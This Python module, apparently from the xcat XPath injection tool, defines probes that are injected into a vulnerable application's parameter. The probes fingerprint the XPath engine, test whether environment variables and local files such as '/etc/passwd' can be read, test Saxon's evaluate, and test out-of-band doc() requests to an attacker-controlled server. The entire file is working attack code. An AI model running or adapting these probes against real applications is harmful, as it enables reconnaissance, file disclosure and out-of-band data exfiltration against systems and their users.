import asyncio
from typing import List, NamedTuple, Callable, Union

from xcat.attack import AttackContext, check
from xcat.injections import Injection
from xpath import E, Expression
from xpath.functions import (available_environment_variables, boolean,
                             current_date_time, doc, doc_available,
                             document_uri, encode_for_uri, ends_with, exists,
                             generate_id, lower_case, normalize_space, string,
                             string_length, string_to_codepoints,
                             substring_before, unparsed_text_available)
from xpath.functions.fs import current_dir
from xpath.functions.saxon import evaluate

from .algorithms import ASCII_SEARCH_SPACE


class Feature(NamedTuple):
    name: str
    tests: List[Union[Expression, Callable]]


def test_oob(path):
    async def test_oob_inner(context: AttackContext, injector: Injection):
        async with context.start_oob_server() as ctx:
            doc_expr = doc(f'{ctx.oob_host}{path}').add_path('/data') == ctx.oob_app['test_response_value']
            return await check(
                context,
                injector(context.target_parameter_value, doc_expr)
            )
    return test_oob_inner


features = [
    Feature('xpath-2',
            [
                lower_case('A') == 'a',
                ends_with('thetest', 'test'),
                encode_for_uri('test') == 'test'
            ]),
    Feature('xpath-3',
            [
                boolean(generate_id(E('/')))
            ]),
    Feature('normalize-space',
            [
                normalize_space('  a  b ') == 'a b'
            ]),
    Feature('substring-search',
            [
                string_length(substring_before(ASCII_SEARCH_SPACE, 'h')) == ASCII_SEARCH_SPACE.find('h'),
                string_length(substring_before(ASCII_SEARCH_SPACE, 'o')) == ASCII_SEARCH_SPACE.find('o')
            ]),
    Feature('codepoint-search',
            [
                string_to_codepoints("test")[1] == 116,
                string_to_codepoints("test")[2] == 101,
                string_to_codepoints("test")[3] == 115,
                string_to_codepoints("test")[4] == 116,
            ]),
    Feature('environment-variables',
            [
                exists(available_environment_variables())
            ]),
    Feature('document-uri',
            [
                document_uri(E('/'))
            ]),
    Feature('current-datetime',
            [
                string(current_date_time())
            ]),
    Feature('unparsed-text',
            [
                unparsed_text_available(document_uri(E('/')))
            ]),
    Feature('doc-function',
            [
                doc_available(document_uri(E('/')))
            ]),
    Feature('linux',
            [
                unparsed_text_available('/etc/passwd')
            ]),
    Feature('expath-file',
            [
                string_length(current_dir()) > 0
            ]),
    Feature('saxon',
            [
                evaluate('1+1') == 2
            ]),
    Feature('oob-http', [test_oob('/test/data')]),
    Feature('oob-entity-injection', [test_oob('/test/entity')])
]


async def detect_features(context: AttackContext, injector: Injection) -> List[Feature]:
    returner = []

    for feature in features:
        futures = [
            check(context, injector(context.target_parameter_value, test))
            if not callable(test)
            else test(context, injector)
            for test in feature.tests
        ]
        checks = await asyncio.gather(*futures)

        returner.append((feature, all(checks)))

    return returner
